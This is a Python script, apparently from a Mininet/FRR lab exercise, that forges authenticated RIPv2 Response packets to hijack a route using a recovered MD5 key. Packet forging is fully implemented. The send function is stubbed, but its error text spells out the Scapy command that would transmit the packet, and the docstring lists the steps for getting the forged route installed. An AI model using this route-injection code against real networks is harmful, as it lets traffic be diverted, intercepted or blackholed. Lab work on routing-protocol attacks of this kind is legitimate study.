"""DEFERRED phase: Scapy route-injection into a live FRR/Mininet topology.

STATUS: STUB. the offensive final step is intentionally NOT executed here. it
requires the instructor's / student's Mininet sandbox with FRR ripd running,
which is not available in this environment.

what IS implemented (safe, offline, testable): forging a valid RFC 2082
authenticated RIPv2 Response with the recovered key, including the correct
keyed-MD5 trailer. what is STUBBED: actually transmitting it onto the wire.

    +-------------------------------------------------------------+
    |  TODO (run only on your Mininet box):                        |
    |   1. bring up the FRR/Mininet topology with ripd + md5 auth  |
    |   2. set KEY / SEQ / target route below to a hijack route    |
    |   3. run with --i-have-mininet --iface <rip-iface>           |
    |   4. verify FRR installs the forged route (vtysh: show ip rip)|
    +-------------------------------------------------------------+
"""
import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from common import keyed_md5


def build_authenticated_rip(routes, key: bytes, seq: int, keyid: int = 1) -> bytes:
    """forge a RIPv2 Response with an RFC 2082 keyed-MD5 auth trailer.

    routes: list of (afi, ip, netmask, nexthop, metric). returns the UDP
    payload (RIP header + auth header + RTEs + auth trailer with real digest).
    """
    cmd, ver = 2, 2
    header = struct.pack("!BBH", cmd, ver, 0)
    rte = b""
    for afi, ip, mask, nexthop, metric in routes:
        rte += struct.pack("!HH", afi, 0)  # AFI, route tag
        rte += bytes(map(int, ip.split(".")))
        rte += bytes(map(int, mask.split(".")))
        rte += bytes(map(int, nexthop.split(".")))
        rte += struct.pack("!I", metric)
    pkt_len = len(header) + 20 + len(rte)  # header..last RTE, excl. trailer
    auth_hdr = struct.pack("!HHHBBI", 0xFFFF, 3, pkt_len, keyid, 20, seq) + b"\x00" * 8
    trailer_hdr = struct.pack("!HH", 0xFFFF, 0x0001)
    data = header + auth_hdr + rte + trailer_hdr  # RFC 2082 MD5 input region
    digest = keyed_md5(data, key)
    return data + digest


def inject(payload: bytes, iface: str, src_ip: str, dst="224.0.0.9"):
    # STUB: do not transmit outside a sanctioned Mininet lab.
    raise NotImplementedError(
        "live injection is deferred. run on your Mininet box with FRR ripd; "
        "then build with scapy: Ether()/IP(src=src_ip,dst=dst)/UDP(sport=520,"
        "dport=520)/Raw(payload) and sendp(..., iface=iface). see module TODO.")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--key", default="ykusrq", help="recovered RIP auth key")
    ap.add_argument("--seq", type=int, default=100)
    ap.add_argument("--route", default="10.0.99.0", help="hijacked network")
    ap.add_argument("--mask", default="255.255.255.0")
    ap.add_argument("--nexthop", default="0.0.0.0")
    ap.add_argument("--metric", type=int, default=1)
    ap.add_argument("--iface", default=None)
    ap.add_argument("--src-ip", default="10.0.0.66")
    ap.add_argument("--i-have-mininet", action="store_true",
                    help="explicit opt-in required to attempt live injection")
    a = ap.parse_args()

    routes = [(2, a.route, a.mask, a.nexthop, a.metric)]
    payload = build_authenticated_rip(routes, a.key.encode(), a.seq)
    print(f"[forge] authenticated RIPv2 Response built: {len(payload)} bytes")
    print(f"[forge] route={a.route}/{a.mask} metric={a.metric} seq={a.seq} key={a.key!r}")
    print(f"[forge] keyed-MD5 trailer = {payload[-16:].hex()}")

    if not a.i_have_mininet:
        print("\n[STUB] live injection is DEFERRED (needs Mininet/FRR).")
        print("[STUB] re-run with --i-have-mininet --iface <iface> on your lab box.")
        return
    inject(payload, a.iface, a.src_ip)


if __name__ == "__main__":
    main()
